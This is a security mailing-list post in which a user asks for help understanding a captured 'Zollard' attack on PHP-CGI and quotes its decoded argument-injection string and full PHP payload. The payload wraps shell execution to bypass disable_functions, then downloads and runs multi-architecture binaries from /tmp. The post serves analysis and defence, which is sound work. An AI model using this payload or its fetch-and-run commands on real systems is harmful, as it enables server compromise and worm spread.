My apologies if this is off-topic for this list, but out of all the  security lists of which I am a member this seems to be the closest one  that fits, so please point me to a more appropriate one in that case..  I'm trying to figure out what this exploit does; it started around the  time that Shellshock did, but I don't think that they're related.  It downloads binaries for several architectures (even a MIPS) which  amongst other things futzes around with IPTABLES (including blocking the  TELNET port) and appears to be self-reproducing.  The hex-encoded stuff in the script below decodes to       "-d+allow_url_include=on+-d+safe_mode=off+-d+suhosin.simulation=on+-d+disable_functions=""+-d+open_basedir=none+-d+auto_prepend_file=php://input+-d+cgi.force_redirect=0+-d+cgi.redirect_status_env=0+-n"   but my PHP-fu doesn't quite extend that far (and that "safe_mode=off"  looks a bit suss).  Script below, kindly supplied by 0wned boxes the world over (in this case,  Korea):  POST HTTP/1.1 Host: xxx.xxx.xxx.xxx User-Agent: Mozilla/5.0 (compatible; Zollard; Linux) Content-Type: application/x-www-form-urlencoded Content-Length: Connection: close  <?php echo "Zollard"; $disablefunc = @ini_get("disable_functions"); if (!empty($disablefunc)) {  $disablefunc = str_replace(" ","",$disablefunc);  $disablefunc = explode(",",$disablefunc); } function myshellexec($cmd) {  global $disablefunc;  $result = "";  if (!empty($cmd))  {   if (is_callable("exec") and !in_array("exec",$disablefunc)) {exec($cmd,$result); $result = join("\n",$result);}   elseif (($result = `$cmd`) !== FALSE) {}   elseif (is_callable("system") and !in_array("system",$disablefunc)) {$v = @ob_get_contents(); @ob_clean(); system($cmd); $result = @ob_get_contents(); @ob_clean(); echo $v;}   elseif (is_callable("passthru") and !in_array("passthru",$disablefunc)) {$v = @ob_get_contents(); @ob_clean(); passthru($cmd); $result = @ob_get_contents(); @ob_clean(); echo $v;}   elseif (is_resource($fp = popen($cmd,"r")))   {    $result = "";    while(!feof($fp)) {$result .=    pclose($fp);   }  }  return $result; } myshellexec("rm -rf /tmp/armeabi;wget -P /tmp +x /tmp/armeabi"); myshellexec("rm -rf /tmp/arm;wget -P /tmp +x /tmp/arm"); myshellexec("rm -rf /tmp/ppc;wget -P /tmp +x /tmp/ppc"); myshellexec("rm -rf /tmp/mips;wget -P /tmp +x /tmp/mips"); myshellexec("rm -rf /tmp/mipsel;wget -P /tmp +x /tmp/mipsel"); myshellexec("rm -rf /tmp/x86;wget -P /tmp +x /tmp/x86"); myshellexec("rm -rf /tmp/nodes;wget -P /tmp +x /tmp/nodes"); myshellexec("rm -rf /tmp/sig;wget -P /tmp +x /tmp/sig"); myshellexec("/tmp/armeabi;/tmp/arm;/tmp/ppc;/tmp/mips;/tmp/mipsel;/tmp/x86;");  -- Dave  Powered by blists - more mailing lists  Please check out the  Open Source Software Security Wiki, which is counterpart to this mailing list.
